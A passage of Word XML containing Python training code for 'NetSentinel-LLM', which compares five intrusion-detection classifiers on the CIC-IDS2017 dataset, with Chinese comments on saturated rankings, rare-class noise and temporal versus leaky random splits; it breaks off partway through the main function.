    <w:p w14:paraId="4ECA9503">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4FAD9F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    gap = ranking[0][0] - ranking[1][0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA59168">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if gap &gt;= 0.005:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBA634F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F7034FE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F64B23F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f"{ranking[0][1]}（{ranking[0][0]:.4f}）与 {ranking[1][1]}（{ranking[1][0]:.4f}）"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B7EBC6B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        f"相差 {gap:.4f}，不到 0.005：这个数据集上它们已经饱和，名次不代表真实差距"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31604B0C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0126F2F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C8B217B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3196B9A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def warn_rare_classes(metrics):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3658A6D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for cls, row in metrics["per_class"].items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A43473">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if row["support"] &lt; RARE_CLASS_SUPPORT:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DE75BAA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            print(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59CE7668">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"[警告] {cls} 在测试集只有 {row['support']} 个样本，"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6752C555">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"该类的 P/R/F1 是噪声，报告里必须声明不可据此下结论",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="049A0DBA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                flush=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04DE9166">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28A65174">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71078FB8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60F1AAB1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 主流程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B920F95">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BEC8874">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A048225">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25221D16">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap = argparse.ArgumentParser(description="NetSentinel-LLM 五模型对比训练")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73BCC669">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--data", required=True, help="CIC-IDS2017 抽样 CSV")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8CEAC2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--config", default="config.yaml")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BB854F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--out", default="models/artifacts")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="000D8161">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--quick", type=int, default=None, help="只取 N 行，快速验证链路")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="589A63B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--only", nargs="*", default=None, help="只训练指定模型")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3196E354">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--dart-ablation", action="store_true", help="只跑 DART 消融")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30647436">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument("--seed", type=int, default=None, help="覆盖 config 里的 random_state")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F52F2CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ap.add_argument(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1355B872">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "--split",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6BE254">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        choices=("random", "temporal", "temporal-cv"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14489F5C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        default="random",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5777B8EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        help="random=分层随机划分（有泄漏，指标饱和）；temporal=按类内部时间顺序留出；"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4406B196">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "temporal-cv=前向滚动验证选型 + 末尾留出汇报（报告用这个）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FED56E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9587EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    args = ap.parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474E6B30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E5D7009">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    cfg = load_config(args.config)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C6DC98">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    mcfg = cfg["model"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E20261C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    seed = args.seed if args.seed is not None else mcfg["random_state"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="129B3C43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out_dir = Path(args.out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0D2998">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out_dir.mkdir(parents=True, exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3E6DB9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76515119">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y, feature_names, meta = load_dataset(args.data, quick=args.quick, seed=seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47ED08A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 统一编码一次：XGBoost 的 sklearn 接口只接受 0..K-1 的整数标签，字符串会直接报错。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1A60D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 因此五个模型全部在整数标签上训练，predict() 返回的也是下标，靠 artifact 里的 classes 还原名称。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00864BBD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    encoder = LabelEncoder().fit(y)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AFA5153">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    y_enc = encoder.transform(y)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F537C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    classes = [str(c) for c in encoder.classes_]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A66F45">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20C8B1E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    order = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB9772D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    folds = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C3D766D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if args.split in ("temporal", "temporal-cv"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4EB0F3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if "__order__" not in meta.columns:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03264241">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise SystemExit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ECE0048">
      <w:pPr>
        <w:widowControl w:val="0"/>
